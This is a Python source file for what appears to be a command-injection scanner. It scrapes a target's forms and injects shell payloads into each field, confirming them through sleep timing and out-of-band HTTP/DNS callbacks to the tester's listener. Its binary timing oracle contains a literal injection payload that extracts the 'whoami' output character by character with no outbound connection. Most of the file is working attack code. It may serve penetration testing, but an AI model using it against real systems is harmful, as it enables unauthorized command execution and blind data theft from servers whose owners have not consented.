import threading
import time
import requests
import sys
import json
import socket
import uuid
from queue import Queue, Empty
from core.listener import start_listener, start_dns_listener
from core.scraper import extract_forms
from core.engine import generate_payloads

GREEN  = "\033[92m"
RED    = "\033[91m"
CYAN   = "\033[96m"
YELLOW = "\033[93m"
RESET  = "\033[0m"

DEFAULT_HTTP_PORT = 8000
DEFAULT_DNS_PORT  = 53
BINARY_CHARSET    = "abcdefghijklmnopqrstuvwxyz0123456789-_"


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def fire_request(method, action, field_name, payload, timeout):
    """Send a single injection request. Returns elapsed seconds or None on error."""
    data  = {field_name: f"test{payload}"}
    start = time.time()
    try:
        if method == "post":
            requests.post(action, data=data, timeout=timeout)
        else:
            requests.get(action, params=data, timeout=timeout)
    except requests.exceptions.ReadTimeout:
        pass
    except Exception as e:
        print(f"  {RED}[!] Network Error: {e}{RESET}")
        return None
    return time.time() - start


def check_oob_queue(oob_queue, canary_map, wait=2.0):
    """
    Wait briefly for a callback, return (proto, path, matched_canary) or None.
    """
    time.sleep(wait)
    try:
        proto, hit_path = oob_queue.get(timeout=0.1)
        matched = None
        for cid, cdata in canary_map.items():
            if cid in hit_path:
                matched = cdata
                break
        return proto, hit_path, matched
    except Empty:
        return None


def run_binary_oracle(action, method, field, baseline):
    """
    Extract whoami char-by-char using only sleep timing.
    Only called when both HTTP and DNS are blocked.
    """
    print(f"\n  {YELLOW}[*] Both HTTP and DNS blocked by firewall.{RESET}")
    print(f"  {YELLOW}[*] Activating binary timing oracle — no outbound connection needed.{RESET}")
    print(f"  [*] Extracting 'whoami' on field '{field}' via sleep...\n")

    result = ""
    for pos in range(1, 13):
        found_char = None
        for char in BINARY_CHARSET:
            payload  = f"; if [ $(whoami | cut -c{pos}) = '{char}' ]; then sleep 5; fi #"
            duration = fire_request(method, action, field, payload, timeout=8)
            if duration is None:
                continue
            if duration >= (baseline + 4):
                result    += char
                found_char = char
                print(f"  [+] Position {pos}: '{char}'  →  so far: '{result}'")
                break
        if found_char is None:
            break
    return result if result else None


def probe_field(action, method, field, payloads, oob_queue,
                canary_map, baseline, lhost, findings):
    """
    Smart probe logic for a single field:

    Step 1 — Time-based (ALWAYS runs — independent detection method)
        Fire sleep payloads. Confirms injection exists regardless of firewall.

    Step 2 — HTTP connectivity probe (ALWAYS runs — parallel to time-based)
        Fire one HTTP payload. If callback received → HTTP works.
        Run all remaining HTTP payloads and return.

    Step 3 — DNS fallback (only if HTTP failed + time-based confirmed)
        Fire DNS payloads. If DNS callback received → DNS works.

    Step 4 — Binary oracle (only if HTTP + DNS both failed + time-based confirmed)
        Extract data char-by-char via sleep timing alone.
    """
    print(f"\n[*] Auditing field: {GREEN}'{field}'{RESET} at {action}")

    time_confirmed = False
    http_works     = False
    dns_works      = False

    # ── Separate payloads by type ──────────────────────────────────────
    time_payloads = [(p, t, d) for p, t, d in payloads if t == "time_based"]
    http_payloads = [(p, t, d) for p, t, d in payloads if t == "oob_http"]
    dns_payloads  = [(p, t, d) for p, t, d in payloads if t == "oob_dns"]

    # ── STEP 1: Time-based detection (always runs) ─────────────────────
    print(f"\n  {CYAN}[Phase 1] Time-based detection...{RESET}")
    for payload_tmpl, _, expected_delay in time_payloads:
        canary_id = uuid.uuid4().hex[:10]
        payload   = payload_tmpl.replace("{CANARY}", canary_id)
        print(f"  [>] Firing (time_based): {payload.strip()}")
        duration  = fire_request(method, action, field, payload,
                                 timeout=expected_delay + 3)
        if duration is None:
            continue
        if duration >= (baseline + expected_delay - 1):
            time_confirmed = True
            findings.append({
                "type":    "TIME-BASED",
                "url":     action,
                "field":   field,
                "payload": payload.strip(),
                "delay":   round(duration, 2),
            })
            print(f"\n  {RED}[!!!] VULNERABILITY CONFIRMED: TIME-BASED [!!!]{RESET}")
            print(f"  [+] '{field}' responded in {duration:.2f}s (baseline: {baseline:.2f}s)\n")
            break   # One confirmation is enough

    if not time_confirmed:
        print(f"  {YELLOW}[-] No time-based delay detected on '{field}'.{RESET}")

    # ── STEP 2: HTTP connectivity probe (always runs) ──────────────────
    print(f"\n  {CYAN}[Phase 2] Testing HTTP connectivity...{RESET}")
    probe_tmpl, _, _ = http_payloads[0]
    canary_id  = uuid.uuid4().hex[:10]
    probe      = probe_tmpl.replace("{CANARY}", canary_id)
    canary_map[canary_id] = {"url": action, "field": field, "payload": probe.strip()}

    print(f"  [>] Probing: {probe.strip()}")
    fire_request(method, action, field, probe, timeout=12)
    result = check_oob_queue(oob_queue, canary_map)

    if result:
        proto, hit_path, matched = result
        http_works = True
        print(f"  {GREEN}[+] HTTP works — running all HTTP payloads.{RESET}")
        findings.append({
            "type":     "OOB-CALLBACK (HTTP)",
            "url":      action,
            "field":    field,
            "payload":  probe.strip(),
            "callback": hit_path,
            "canary":   canary_id,
        })
        print(f"\n  {RED}[!!!] VULNERABILITY CONFIRMED: OOB HTTP [!!!]{RESET}")
        print(f"  [+] Callback: {hit_path}  Canary: {canary_id}\n")

        # Run remaining HTTP payloads
        for payload_tmpl, _, _ in http_payloads[1:]:
            canary_id = uuid.uuid4().hex[:10]
            payload   = payload_tmpl.replace("{CANARY}", canary_id)
            canary_map[canary_id] = {"url": action, "field": field, "payload": payload.strip()}
            print(f"  [>] Firing (oob_http): {payload.strip()}")
            fire_request(method, action, field, payload, timeout=12)
            res = check_oob_queue(oob_queue, canary_map)
            if res:
                proto, hit_path, matched = res
                findings.append({
                    "type":     "OOB-CALLBACK (HTTP)",
                    "url":      action,
                    "field":    field,
                    "payload":  payload.strip(),
                    "callback": hit_path,
                    "canary":   canary_id,
                })
                print(f"  {RED}[!!!] OOB HTTP CALLBACK [!!!]{RESET}")
                print(f"  [+] Callback: {hit_path}  Canary: {canary_id}\n")

        return   # HTTP worked — DNS and oracle not needed

    print(f"  {YELLOW}[-] No HTTP callback received.{RESET}")

    # ── STEP 3: DNS fallback (HTTP failed + time-based confirmed) ──────
    if not time_confirmed:
        print(f"  {GREEN}[-] No injection detected on '{field}'. Skipping DNS.{RESET}")
        return

    print(f"\n  {CYAN}[Phase 3] HTTP blocked. Trying DNS fallback...{RESET}")
    for payload_tmpl, _, _ in dns_payloads:
        canary_id = uuid.uuid4().hex[:10]
        payload   = payload_tmpl.replace("{CANARY}", canary_id)
        canary_map[canary_id] = {"url": action, "field": field, "payload": payload.strip()}
        print(f"  [>] Firing (oob_dns): {payload.strip()}")
        fire_request(method, action, field, payload, timeout=12)
        res = check_oob_queue(oob_queue, canary_map)
        if res:
            proto, hit_path, matched = res
            dns_works = True
            findings.append({
                "type":     "OOB-CALLBACK (DNS)",
                "url":      action,
                "field":    field,
                "payload":  payload.strip(),
                "callback": hit_path,
                "canary":   canary_id,
            })
            print(f"\n  {RED}[!!!] VULNERABILITY CONFIRMED: OOB DNS [!!!]{RESET}")
            print(f"  [+] Callback: {hit_path}  Canary: {canary_id}\n")

    if dns_works:
        return   # DNS worked — oracle not needed

    # ── STEP 4: Binary oracle (HTTP + DNS both failed) ─────────────────
    extracted = run_binary_oracle(action, method, field, baseline)
    if extracted:
        findings.append({
            "type":      "BINARY-ORACLE",
            "url":       action,
            "field":     field,
            "extracted": extracted,
            "note":      "Extracted via sleep timing — no outbound connection needed",
        })
        print(f"\n  {RED}[!!!] BINARY ORACLE RESULT [!!!]{RESET}")
        print(f"  [+] Extracted whoami: '{extracted}'\n")


def run_orchestrator(target_url, lhost):
    print(f"\n[*] {CYAN}Initializing OOB Orchestrator...{RESET}")
    print(f"[*] LHOST: {lhost}")

    oob_queue  = Queue()
    canary_map = {}

    # Start HTTP listener
    threading.Thread(
        target=start_listener,
        args=(lhost, DEFAULT_HTTP_PORT, oob_queue),
        daemon=True
    ).start()

    # Start DNS listener (falls back gracefully if no sudo)
    threading.Thread(
        target=start_dns_listener,
        args=(lhost, DEFAULT_DNS_PORT, oob_queue),
        daemon=True
    ).start()

    time.sleep(1)

    # Scrape forms + URL query params
    surfaces = extract_forms(target_url)
    if not surfaces:
        print(f"{RED}[-] No attack surface found on target.{RESET}")
        return

    # Generate payloads
    payloads = generate_payloads(lhost, DEFAULT_HTTP_PORT)

    # Measure median baseline (3 samples to avoid fluke)
    print(f"\n[*] {CYAN}Measuring baseline response time...{RESET}")
    try:
        samples  = [requests.get(target_url, timeout=10).elapsed.total_seconds()
                    for _ in range(3)]
        baseline = sorted(samples)[1]   # median
        print(f"[*] Baseline (median of 3): {baseline:.2f}s")
    except Exception:
        baseline = 0.0

    findings = []

    # Probe every field on every surface
    for surface in surfaces:
        for inp in surface["inputs"]:
            probe_field(
                action     = surface["action"],
                method     = surface["method"],
                field      = inp["name"],
                payloads   = payloads,
                oob_queue  = oob_queue,
                canary_map = canary_map,
                baseline   = baseline,
                lhost      = lhost,
                findings   = findings,
            )

    # Summary
    print(f"\n{'='*55}")
    if findings:
        print(f"{RED}[!!!] {len(findings)} FINDING(S) CONFIRMED{RESET}")
        for i, f in enumerate(findings, 1):
            print(f"\n  [{i}] Type    : {f['type']}")
            print(f"       URL     : {f['url']}")
            print(f"       Field   : {f['field']}")
            if "payload"   in f: print(f"       Payload : {f['payload']}")
            if "delay"     in f: print(f"       Delay   : {f['delay']}s")
            if "callback"  in f: print(f"       Callback: {f['callback']}")
            if "canary"    in f: print(f"       Canary  : {f['canary']}")
            if "extracted" in f: print(f"       Extracted: {f['extracted']}")
            if "note"      in f: print(f"       Note    : {f['note']}")
    else:
        print(f"{GREEN}[+] No vulnerabilities detected.{RESET}")

    # Save report
    report = {
        "target":   target_url,
        "lhost":    lhost,
        "baseline": round(baseline, 2),
        "findings": findings,
    }
    with open("report.json", "w") as fh:
        json.dump(report, fh, indent=2)

    print(f"\n[*] {GREEN}Report saved to report.json{RESET}")
    print(f"[*] {GREEN}Orchestration complete.{RESET}")
    time.sleep(1)


if __name__ == "__main__":
    print(f"{CYAN}{'='*55}")
    print(f"      OOB Command Injection Scanner")
    print(f"{'='*55}{RESET}")
    print(f"{YELLOW}[!] For DNS listener run with: sudo python3 main.py{RESET}\n")

    try:
        target = input("[?] Enter Target URL (e.g. http://127.0.0.1:9000): ").strip()
        if not target:
            print(f"{RED}[!] No URL provided. Exiting.{RESET}")
            sys.exit(1)

        lhost = get_local_ip()
        run_orchestrator(target, lhost)

    except KeyboardInterrupt:
        print(f"\n{RED}[!] User interrupted. Exiting.{RESET}")